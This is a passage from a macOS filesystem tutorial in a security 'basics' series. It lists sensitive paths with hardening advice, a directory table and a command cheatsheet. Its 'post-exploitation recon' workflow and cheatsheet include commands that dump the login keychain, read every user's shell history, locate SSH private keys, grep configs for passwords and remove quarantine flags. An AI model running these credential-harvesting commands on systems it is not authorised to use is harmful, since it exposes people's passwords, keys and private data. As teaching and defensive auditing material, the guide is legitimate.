| `diskutil` | Disk & partition management |
| `tmutil` | Time Machine & snapshots |
| `fdesetup` | FileVault control |

---

## 18. Security Note: Sensitive Locations & Defensive Hardening

These locations are high-value to attackers and defenders alike. Use them for TCC/SIP audits, Keychain hygiene, and LaunchAgent hardening on Macs you manage, not as a privilege-escalation exploit guide.

```bash
# ── HIGH-VALUE PATHS (defender inventory) ────────────────────
~/Library/Keychains/login.keychain-db
/Library/Keychains/System.keychain
# Prefer FileVault + strong login password; lock keychain when idle

~/Library/Application\ Support/com.apple.TCC/TCC.db
# Audit privacy grants; reset overly broad app permissions

~/.ssh/                 # private keys: mode 700/600
~/.zsh_history          # avoid secrets on CLI

~/Library/LaunchAgents/
/Library/LaunchAgents/
/Library/LaunchDaemons/
# Inventory plist labels; alert on unsigned / unexpected jobs

# Platform protections (verify enabled)
csrutil status          # SIP
spctl --status          # Gatekeeper
fdesetup status         # FileVault
```

### Defensive Hardening Focus

| Control | Action |
|---------|--------|
| FileVault | Full-disk encryption |
| SIP / Gatekeeper | Keep enabled |
| Keychain | Lock when idle; no shared logins |
| LaunchAgents | Baseline + signed plists |
| TCC | Least privacy grants |
| SSH keys | `chmod 600`; use a passphrase |
| Unified logging | Forward auth events |

Unexpected LaunchDaemons, disabled SIP/Gatekeeper, or world-writable LaunchAgent plists are critical hardening findings (see the Apple Platform Security Guide).

### macOS Security Priority Table

| Location | Risk level | Reason |
|----------|--------------|--------|
| `login.keychain-db` | Critical | Stored passwords & certs |
| `TCC.db` | Critical | Privacy permissions database |
| `~/.ssh/id_rsa` | High | SSH private key |
| `LaunchAgents/Daemons` | Critical | Primary persistence vector |
| `.zsh_history` | High | Command history + passwords |
| `chat.db` / `History.db` | High | Sensitive personal data |
| `/etc/sudoers` | Critical | Root permission config |
| `.DS_Store` | Medium | Folder structure leak |
| `DiagnosticReports/` | Medium | Crash & memory details |

---

## Complete Directory Reference Table

| Directory | Function | Linux equivalent |
|-----------|----------|--------------------|
| `/` | Root directory (firmlink view) | `/` |
| `/Applications` | Installed applications | `/usr/share/applications` (loosely) |
| `/System` | Core OS, SIP-protected | `/usr`, `/lib` (combined) |
| `/Library` | System-level app data | `/etc`, `/var/lib` (loosely) |
| `~/Library` | Per-user app data | `~/.config`, `~/.local/share` |
| `/Users` | User home directories | `/home` |
| `/private/etc` | Unix configuration | `/etc` |
| `/private/var` | Variable data & logs | `/var` |
| `/private/tmp` | Temporary files | `/tmp` |
| `/bin`, `/sbin` | Essential Unix binaries | `/bin`, `/sbin` |
| `/usr` | Unix shared resources | `/usr` |
| `/opt/homebrew` | Package manager (Apple Silicon) | `/usr/local` |
| `/Volumes` | External drives & mounts | `/mnt`, `/media` |

---

## 19. Practical Workflow Example

```bash
# ── SCENARIO: macOS post-exploitation filesystem recon ──────────────

# 1. Who am I and what privileges do I have?
$ whoami
$ id
$ groups
$ dscl . -read /Groups/admin GroupMembership

# 2. System information
$ sw_vers                              # macOS version
$ uname -a
$ system_profiler SPHardwareDataType   # hardware details
$ sysctl -n machdep.cpu.brand_string   # CPU info

# 3. List all local users
$ dscl . list /Users | grep -v "^_"
$ dscl . -read /Users/alice

# 4. Check SIP and Gatekeeper status
$ csrutil status
$ spctl --status

# 5. Hunt for credentials in Keychain
$ security dump-keychain ~/Library/Keychains/login.keychain-db
$ security find-generic-password -ga "wifi-network-name"

# 6. Check shell history across all users
$ for user in $(dscl . list /Users | grep -v "^_"); do
    echo "=== $user ==="
    sudo cat "/Users/$user/.zsh_history" 2>/dev/null
done

# 7. Find SSH keys
$ find /Users -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# 8. Check persistence locations
$ ls -la ~/Library/LaunchAgents/ /Library/LaunchAgents/ /Library/LaunchDaemons/
$ launchctl list | grep -v com.apple

# 9. Check login items
$ osascript -e 'tell application "System Events" to get the name of every login item'

# 10. Check sudo privileges
$ sudo -l

# 11. Find writable system locations (privesc)
$ find / -writable -type d 2>/dev/null | grep -v -E "^/(dev|proc|private/var/folders)"

# 12. Check installed applications for known vulnerable versions
$ system_profiler SPApplicationsDataType > installed_apps.txt

# 13. Search for credentials in config files
$ grep -r "password" ~/Library/Application\ Support/ 2>/dev/null | head -20

# 14. Check recent security-related unified log events
$ log show --predicate 'eventMessage contains "authentication" OR eventMessage contains "sudo"' --last 1d

# 15. Check TCC database for privacy permission grants (Full Disk Access apps etc.)
$ sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
    "SELECT client, service FROM access WHERE auth_value=2;"
```

---

## Quick Reference Cheatsheet

```bash
# ── NAVIGATION ───────────────────────────────────────────────────
cd /                                # go to root
ls -la ~/Library                    # hidden per-user library
chflags nohidden ~/Library          # unhide Library in Finder
open .                              # open current dir in Finder
open -a "Terminal" .                # open in new Terminal window

# ── SYSTEM INFO ──────────────────────────────────────────────────
sw_vers                             # macOS version
uname -a                            # kernel info
system_profiler SPHardwareDataType  # hardware details
sysctl -n hw.model                  # Mac model identifier
uname -m                            # arm64 (Apple Silicon) or x86_64 (Intel)

# ── USER & GROUPS ────────────────────────────────────────────────
dscl . list /Users                  # all user accounts
dscl . -read /Users/<user>          # user details
dscl . -read /Groups/admin GroupMembership   # admin members
id; whoami; groups

# ── KEYCHAIN ─────────────────────────────────────────────────────
security list-keychains
security find-generic-password -ga "ServiceName"
security dump-keychain ~/Library/Keychains/login.keychain-db

# ── SECURITY PROTECTIONS ─────────────────────────────────────────
csrutil status                      # SIP status
spctl --status                      # Gatekeeper status
xattr -d com.apple.quarantine file  # remove quarantine flag
codesign -dv --verbose=4 app.app    # check code signature

# ── PERSISTENCE LOCATIONS ────────────────────────────────────────
~/Library/LaunchAgents/
/Library/LaunchAgents/
/Library/LaunchDaemons/
launchctl list | grep -v com.apple

# ── LOGS (UNIFIED LOGGING) ───────────────────────────────────────
log show --last 1h
log stream --predicate 'process == "sshd"'
log show --predicate 'eventMessage contains "password"' --last 1d

# ── NETWORK INFO ──────────────────────────────────────────────────
lsof -i -P                          # listening ports (netstat replacement)
networksetup -listallhardwareports
scutil --dns

# ── FIND COMMANDS ────────────────────────────────────────────────
find / -name "*.plist" 2>/dev/null              # find plist configs
find / -perm -4000 2>/dev/null                  # find SUID files
find / -writable -type d 2>/dev/null            # find writable dirs
find /Users -name "id_rsa" 2>/dev/null          # find SSH keys
find / -name "*.app" -maxdepth 4 2>/dev/null    # find installed apps

# ── DISK & VOLUMES ───────────────────────────────────────────────
diskutil list                       # list disks/volumes
df -h                                # disk usage
fdesetup status                      # FileVault encryption status
tmutil listlocalsnapshots /          # Time Machine snapshots

# ── APP BUNDLE ANALYSIS ──────────────────────────────────────────
plutil -p App.app/Contents/Info.plist     # read plist as JSON-like
otool -L App.app/Contents/MacOS/App        # linked libraries
lipo -info App.app/Contents/MacOS/App      # architecture info
codesign -d --entitlements - App.app       # entitlements
```

---

> References & Book Sources:
> - Apple, *Apple Platform Security Guide* (`https://support.apple.com/guide/security/welcome/web`)
> - [Apple Developer — File System Programming Guide](https://developer.apple.com/library/archive/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/)
> - Brian Ward, *How Linux Works* (`~/Documents/Books/CyberSec/Linux/`) — Unix filesystem concepts transferable to Darwin
> - [Objective-See - macOS Security Resources](https://objective-see.org)
> - `man hier` — manual page for the macOS filesystem hierarchy

> **Zero2Root** | Basics Series | kodoktheGr3at | 2026
> **Repository:** [Zero2Root](https://github.com/Kodokthegr3at/Zero2Root)
> **Feedback and contributions welcome.** Open an issue or PR if you spot any errors.
